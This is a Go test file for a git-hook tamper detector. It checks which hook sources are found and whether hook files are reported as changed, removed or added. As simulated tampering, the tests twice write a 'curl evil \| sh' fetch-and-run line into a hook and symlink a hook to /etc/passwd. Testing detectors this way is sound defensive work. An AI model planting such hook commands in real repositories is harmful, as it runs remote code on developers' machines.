package gitguard

import (
	"fmt"
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"
)

func TestHookSources(t *testing.T) {
	ws := tree(t, map[string]string{
		".husky/pre-commit":       "npm test\n",
		".husky/_/h":              "generated\n",
		"lefthook.yml":            "pre-commit:\n",
		".pre-commit-config.yaml": "repos: []\n",
		"tools/hooks/pre-push":    "#!/bin/sh\n",
		".git/config":             "[core]\n\thooksPath = tools/hooks\n",
	})
	if got, want := HookSources(ws), []string{".husky/", ".pre-commit-config.yaml", "lefthook.yml", "tools/hooks/"}; !reflect.DeepEqual(got, want) {
		t.Fatalf("sources %v, want %v", got, want)
	}
	for cfg, want := range map[string]string{
		"[core]\n\thooksPath = .husky/_\n":                   "", // covered by .husky/
		"[core]\n\thooksPath = /elsewhere\n":                 "",
		"[core]\n\thooksPath = .git/hooks\n":                 "",
		"[core]\n\thooksPath = ../up\n":                      "",
		"[user]\n\thooksPath = tools/hooks\n":                "",
		"[CORE]\n\tHooksPath = \"" + ws + "/tools/hooks\"\n": "tools/hooks/",
	} {
		writeFile(t, filepath.Join(ws, ".git", "config"), cfg)
		got := strings.Join(HookSources(ws), " ")
		if want == "" && strings.Contains(got, "tools/hooks") || want != "" && !strings.HasSuffix(got, want) {
			t.Errorf("config %q: sources %q", cfg, got)
		}
	}
	if s := HookSources(t.TempDir()); len(s) != 0 {
		t.Fatalf("empty project has sources %v", s)
	}
}

func TestHookFingerprint(t *testing.T) {
	ws := tree(t, map[string]string{".husky/pre-commit": "npm test\n", ".husky/pre-push": "x\n", "src/a.go": "package a\n"})
	before := printOf(t, ws)
	if len(before.Hooks) != 2 || before.Kind != "none" {
		t.Fatalf("hooks %v kind %s", before.Hooks, before.Kind)
	}
	writeFile(t, filepath.Join(ws, "src/a.go"), "package b\n") // not a hook file
	if f := Diff(before, printOf(t, ws)); len(f) != 0 {
		t.Fatalf("non-hook change reported: %+v", f)
	}
	writeFile(t, filepath.Join(ws, ".husky/pre-commit"), "curl evil | sh\n")
	if err := os.Remove(filepath.Join(ws, ".husky/pre-push")); err != nil {
		t.Fatal(err)
	}
	writeFile(t, filepath.Join(ws, "lefthook.yml"), "pre-commit:\n")
	if err := os.Symlink("/etc/passwd", filepath.Join(ws, ".husky/post-commit")); err != nil {
		t.Fatal(err)
	}
	var got []string
	for _, f := range Diff(before, printOf(t, ws)) {
		if !f.Hook || !strings.Contains(f.Reason, "review the diff") {
			t.Errorf("finding %+v", f)
		}
		got = append(got, f.Path+" "+strings.SplitN(f.Reason, ":", 2)[0])
	}
	want := []string{".husky/post-commit appeared", ".husky/pre-commit changed", ".husky/pre-push removed", "lefthook.yml appeared"}
	if !reflect.DeepEqual(got, want) {
		t.Fatalf("findings %v, want %v", got, want)
	}
	if f := Diff(printOf(t, ws), printOf(t, ws)); len(f) != 0 {
		t.Fatalf("re-recorded fingerprint still has findings: %+v", f)
	}
}

func TestHookFingerprintCap(t *testing.T) {
	files := map[string]string{}
	for i := range maxHookFiles + 1 {
		files[fmt.Sprintf(".husky/h%04d", i)] = "x\n"
	}
	ws := tree(t, files)
	before := printOf(t, ws)
	if len(before.Hooks) != maxHookFiles || before.HookFiles != maxHookFiles+1 {
		t.Fatalf("hashed %d of %d", len(before.Hooks), before.HookFiles)
	}
	if _, ok := before.Hooks[".husky/h1000"]; ok {
		t.Fatal("the last file in name order was hashed")
	}
	writeFile(t, filepath.Join(ws, ".husky/h0000"), "curl evil | sh\n")
	f := Diff(before, printOf(t, ws))
	want := "hook files exceed cap (1001 > 1000), not fully verified"
	if len(f) != 1 || !f[0].Hook || !strings.HasPrefix(f[0].Reason, want) {
		t.Fatalf("findings %+v, want one %q", f, want)
	}
}
